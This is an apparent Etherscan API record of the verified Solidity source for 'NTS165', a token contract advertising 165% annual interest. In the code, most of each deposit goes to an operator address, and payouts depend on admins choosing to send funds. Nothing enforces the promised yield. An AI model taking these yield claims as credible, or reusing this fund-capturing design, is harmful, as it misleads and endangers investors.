{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.1;\r\n\r\n/*\r\n    Deposit terms:\r\n    165% annual interest in USDC\r\n    30% quarterly payments\r\n    45% bonus in last two quaters, if fund reaches plan 350% in total annual profit\r\n\r\n    Interest periods:\r\n    Q1 15-20 January 2020\r\n    Q2 15-20 April 2020\r\n    Q3 15-20 July 2020\r\n    Q4 15-20 October 2020\r\n*/\r\n\r\ncontract NTS {\r\n    function fund() external payable;\r\n}\r\n\r\ncontract NTS165 {\r\n    modifier onlyBagholders {\r\n        require(myTokens() > 0);\r\n        _;\r\n    }\r\n\r\n    modifier onlyStronghands {\r\n        require(myDividends(true) > 0);\r\n        _;\r\n    }\r\n\r\n    modifier onlyAdmin {\r\n        require(msg.sender == admin);\r\n        _;\r\n    }\r\n\r\n    modifier onlyBoss2 {\r\n        require(msg.sender == boss2);\r\n        _;\r\n    }\r\n\r\n    string public name = \"NTS 165\";\r\n    string public symbol = \"NTS165\";\r\n    address public admin;\r\n    address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada;\r\n    address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4;\r\n    uint8 constant public decimals = 18;\r\n    uint8 constant internal welcomeFee_ = 10;\r\n    uint8 constant internal refLevel1_ = 4;\r\n    uint8 constant internal refLevel2_ = 2;\r\n    uint8 constant internal refLevel3_ = 2;\r\n    uint256 constant internal tokenPrice = 0.001 ether;\r\n\r\n    uint256 constant internal magnitude = 2 ** 64;\r\n    uint256 public stakingRequirement = 1 ether;\r\n    mapping(address => uint256) internal tokenBalanceLedger_;\r\n    mapping(address => uint256) public referralBalance_;\r\n    mapping(address => int256) internal payoutsTo_;\r\n    mapping(address => uint256) public repayBalance_;\r\n    mapping(address => bool) public mayPassRepay;\r\n\r\n    uint256 internal tokenSupply_;\r\n    uint256 internal profitPerShare_;\r\n    bool public saleOpen = true;\r\n\r\n    NTS constant internal nts81 = NTS(0x897D6c6772B85bf25B46c6F6DA454133478ea6ab);\r\n\r\n    constructor() public {\r\n        admin = msg.sender;\r\n        mayPassRepay[boss1] = true;\r\n        mayPassRepay[boss2] = true;\r\n    }\r\n\r\n    function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {\r\n        require(msg.value >= 1 ether, \"Minimum deposit of 1 ETH is allowed.\");\r\n        require(saleOpen, \"Sales stopped for the moment.\");\r\n        return purchaseTokens(msg.value, _ref1, _ref2, _ref3);\r\n    }\r\n\r\n    function() external payable {\r\n        require(msg.value >= 1 ether, \"Minimum deposit of 1 ETH is allowed.\");\r\n        require(saleOpen, \"Sales stopped for the moment.\");\r\n        purchaseTokens(msg.value, address(0x0), address(0x0), address(0x0));\r\n    }\r\n\r\n    function reinvest() onlyStronghands public {\r\n        uint256 _dividends = myDividends(false);\r\n        address _customerAddress = msg.sender;\r\n        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);\r\n        _dividends += referralBalance_[_customerAddress];\r\n        referralBalance_[_customerAddress] = 0;\r\n        uint256 _tokens = purchaseTokens(_dividends, address(0x0), address(0x0), address(0x0));\r\n        emit OnReinvestment(_customerAddress, _dividends, _tokens, now);\r\n    }\r\n\r\n    function exit() public {\r\n        address _customerAddress = msg.sender;\r\n        uint256 _tokens = tokenBalanceLedger_[_customerAddress];\r\n        if (_tokens > 0) getRepay();\r\n        withdraw();\r\n    }\r\n\r\n    function withdraw() onlyStronghands public {\r\n        address payable _customerAddress = msg.sender;\r\n        uint256 _dividends = myDividends(false);\r\n        payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);\r\n        _dividends += referralBalance_[_customerAddress];\r\n        referralBalance_[_customerAddress] = 0;\r\n        _customerAddress.transfer(_dividends);\r\n        emit OnWithdraw(_customerAddress, _dividends, now);\r\n    }\r\n\r\n    function getRepay() public {\r\n        address payable _customerAddress = msg.sender;\r\n        uint256 balance = repayBalance_[_customerAddress];\r\n        require(balance > 0);\r\n        repayBalance_[_customerAddress] = 0;\r\n        uint256 tokens = tokenBalanceLedger_[_customerAddress];\r\n        tokenBalanceLedger_[_customerAddress] = 0;\r\n        tokenSupply_ = tokenSupply_ - tokens;\r\n\r\n        _customerAddress.transfer(balance);\r\n        emit OnGotRepay(_customerAddress, balance, now);\r\n    }\r\n\r\n    function myTokens() public view returns (uint256) {\r\n        address _customerAddress = msg.sender;\r\n        return balanceOf(_customerAddress);\r\n    }\r\n\r\n    function myDividends(bool _includeReferralBonus) public view returns (uint256) {\r\n        address _customerAddress = msg.sender;\r\n        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;\r\n    }\r\n    \r\n    function dividendsByAddress(address _customerAddress, bool _includeReferralBonus) public view returns (uint256) {\r\n        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;\r\n    }\r\n\r\n    function balanceOf(address _customerAddress) public view returns (uint256) {\r\n        return tokenBalanceLedger_[_customerAddress];\r\n    }\r\n\r\n    function dividendsOf(address _customerAddress) public view returns (uint256) {\r\n        return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;\r\n    }\r\n\r\n    function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {\r\n        address _customerAddress = msg.sender;\r\n\r\n        uint256[5] memory uIntValues = [\r\n            _incomingEthereum * welcomeFee_ / 100,\r\n            0,\r\n            0,\r\n            0,\r\n            0\r\n        ];\r\n\r\n        uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_;\r\n        uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_;\r\n        uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_;\r\n        uIntValues[4] = uIntValues[0] * 1 / welcomeFee_;\r\n\r\n        uint256 _dividends = uIntValues[0] - uIntValues[1] - uIntValues[2] - uIntValues[3] - uIntValues[4];\r\n        uint256 _taxedEthereum = _incomingEthereum - uIntValues[0];\r\n\r\n        uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);\r\n        uint256 _fee = _dividends * magnitude;\r\n\r\n        require(_amountOfTokens > 0);\r\n\r\n        if (\r\n            _ref1 != 0x0000000000000000000000000000000000000000 &&\r\n            tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement\r\n        ) {\r\n            referralBalance_[_ref1] += uIntValues[1];\r\n        } else {\r\n            referralBalance_[boss1] += uIntValues[1];\r\n            _ref1 = 0x0000000000000000000000000000000000000000;\r\n        }\r\n\r\n        if (\r\n            _ref2 != 0x0000000000000000000000000000000000000000 &&\r\n            tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement\r\n        ) {\r\n            referralBalance_[_ref2] += uIntValues[2];\r\n        } else {\r\n            referralBalance_[boss1] += uIntValues[2];\r\n            _ref2 = 0x0000000000000000000000000000000000000000;\r\n        }\r\n\r\n        if (\r\n            _ref3 != 0x0000000000000000000000000000000000000000 &&\r\n            tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement\r\n        ) {\r\n            referralBalance_[_ref3] += uIntValues[3];\r\n        } else {\r\n            referralBalance_[boss1] += uIntValues[3];\r\n            _ref3 = 0x0000000000000000000000000000000000000000;\r\n        }\r\n\r\n        referralBalance_[boss2] += _taxedEthereum;\r\n\r\n        if (tokenSupply_ > 0) {\r\n            tokenSupply_ += _amountOfTokens;\r\n            profitPerShare_ += (_dividends * magnitude / tokenSupply_);\r\n            _fee = _fee - (_fee - (_amountOfTokens * (_dividends * magnitude / tokenSupply_)));\r\n        } else {\r\n            tokenSupply_ = _amountOfTokens;\r\n        }\r\n\r\n        tokenBalanceLedger_[_customerAddress] += _amountOfTokens;\r\n        int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens - _fee);\r\n        payoutsTo_[_customerAddress] += _updatedPayouts;\r\n\r\n        nts81.fund.value(uIntValues[4])();\r\n\r\n        emit OnTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, now);\r\n\r\n        return _amountOfTokens;\r\n    }\r\n\r\n    function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) {\r\n        uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice;\r\n\r\n        return _tokensReceived;\r\n    }\r\n\r\n    function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) {\r\n        uint256 _etherReceived = _tokens / tokenPrice * 1e18;\r\n\r\n        return _etherReceived;\r\n    }\r\n\r\n    function fund() public payable {\r\n        uint256 perShare = msg.value * magnitude / tokenSupply_;\r\n        profitPerShare_ += perShare;\r\n        emit OnFunded(msg.sender, msg.value, perShare, now);\r\n    }\r\n\r\n    /* Admin methods */\r\n    function passRepay(address customerAddress) public payable {\r\n        require(mayPassRepay[msg.sender], \"Not allowed to pass repay from your address.\");\r\n        uint256 value = msg.value;\r\n        require(value > 0);\r\n\r\n        repayBalance_[customerAddress] += value;\r\n        emit OnRepayPassed(customerAddress, msg.sender, value, now);\r\n    }\r\n\r\n    function allowPassRepay(address payer) public onlyAdmin {\r\n        mayPassRepay[payer] = true;\r\n        emit OnRepayAddressAdded(payer, now);\r\n    }\r\n\r\n    function denyPassRepay(address payer) public onlyAdmin {\r\n        mayPassRepay[payer] = false;\r\n        emit OnRepayAddressRemoved(payer, now);\r\n    }\r\n\r\n    function passInterest(address customerAddress, uint256 ethRate, uint256 rate) public payable {\r\n        require(mayPassRepay[msg.sender], \"Not allowed to pass interest from your address.\");\r\n        require(msg.value > 0);\r\n\r\n        referralBalance_[customerAddress] += msg.value;\r\n\r\n        emit OnInterestPassed(customerAddress, msg.value, ethRate, rate, now);\r\n    }\r\n\r\n    function saleStop() public onlyAdmin {\r\n        saleOpen = false;\r\n        emit OnSaleStop(now);\r\n    }\r\n\r\n    function saleStart() public onlyAdmin {\r\n        saleOpen = true;\r\n        emit OnSaleStart(now);\r\n    }\r\n\r\n    event OnTokenPurchase(\r\n        address indexed customerAddress,\r\n        uint256 incomingEthereum,\r\n        uint256 tokensMinted,\r\n        address ref1,\r\n        address ref2,\r\n        address ref3,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnReinvestment(\r\n        address indexed customerAddress,\r\n        uint256 ethereumReinvested,\r\n        uint256 tokensMinted,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnWithdraw(\r\n        address indexed customerAddress,\r\n        uint256 value,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnGotRepay(\r\n        address indexed customerAddress,\r\n        uint256 value,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnFunded(\r\n        address indexed source,\r\n        uint256 value,\r\n        uint256 perShare,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnRepayPassed(\r\n        address indexed customerAddress,\r\n        address indexed payer,\r\n        uint256 value,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnInterestPassed(\r\n        address indexed customerAddress,\r\n        uint256 value,\r\n        uint256 ethRate,\r\n        uint256 rate,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnSaleStop(\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnSaleStart(\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnRepayAddressAdded(\r\n        address indexed payer,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnRepayAddressRemoved(\r\n        address indexed payer,\r\n        uint256 timestamp\r\n    );\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"}],\"name\":\"dividendsOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"payer\",\"type\":\"address\"}],\"name\":\"allowPassRepay\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_ethereum\",\"type\":\"uint256\"}],\"name\":\"ethereumToTokens_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"customerAddress\",\"type\":\"address\"},{\"name\":\"ethRate\",\"type\":\"uint256\"},{\"name\":\"rate\",\"type\":\"uint256\"}],\"name\":\"passInterest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"mayPassRepay\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"stakingRequirement\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"repayBalance_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_includeReferralBonus\",\"type\":\"bool\"}],\"name\":\"myDividends\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"saleStop\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getRepay\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"myTokens\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_ref1\",\"type\":\"address\"},{\"name\":\"_ref2\",\"type\":\"address\"},{\"name\":\"_ref3\",\"type\":\"address\"}],\"name\":\"buy\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"saleOpen\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"customerAddress\",\"type\":\"address\"}],\"name\":\"passRepay\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"saleStart\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"fund\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_customerAddress\",\"type\":\"address\"},{\"name\":\"_includeReferralBonus\",\"type\":\"bool\"}],\"name\":\"dividendsByAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_tokens\",\"type\":\"uint256\"}],\"name\":\"tokensToEthereum_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"referralBalance_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"payer\",\"type\":\"address\"}],\"name\":\"denyPassRepay\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"exit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reinvest\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"incomingEthereum\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"tokensMinted\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"ref1\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"ref2\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"ref3\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnTokenPurchase\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"ethereumReinvested\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"tokensMinted\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnReinvestment\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnWithdraw\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnGotRepay\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"source\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"perShare\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnFunded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"payer\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnRepayPassed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"ethRate\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"rate\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnInterestPassed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnSaleStop\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnSaleStart\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"payer\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnRepayAddressAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"payer\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnRepayAddressRemoved\",\"type\":\"event\"}]","ContractName":"NTS165","CompilerVersion":"v0.5.1+commit.c8a2cb62","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://94fe63bbbc4a5f02edc0620ccb8bbec4f629a1e704baec2eb2dce7510b601604"}]}